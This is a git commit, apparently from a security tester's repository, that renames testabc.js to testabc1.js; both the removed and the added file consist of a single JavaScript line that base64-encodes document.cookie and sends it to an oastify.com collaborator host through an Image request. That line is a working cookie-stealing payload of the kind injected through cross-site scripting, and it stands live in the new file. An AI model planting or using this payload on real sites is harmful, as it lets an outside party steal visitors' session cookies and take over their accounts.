00b65b0769088a45bedc9351de60ebbdae166eba
sefa <113290365+absosec@users.noreply.github.com>
2024-05-06 01:27:49 +0300

    Update and rename testabc.js to testabc1.js

--- testabc.js
+++
@@ -1,1 +0,0 @@
-x = new Image(); x.src = 'http://dgxxcj8cqyf9yc72lxe89dstpkvbj57u.oastify.com?data='+btoa(document.cookie); 
---
+++ testabc1.js
@@ -0,0 +1,1 @@
+var i=new Image(); i.src="http://p5v91vxofa4lnowea93kyph5ewkn8iw7.oastify.com/?cookie="+btoa(document.cookie);
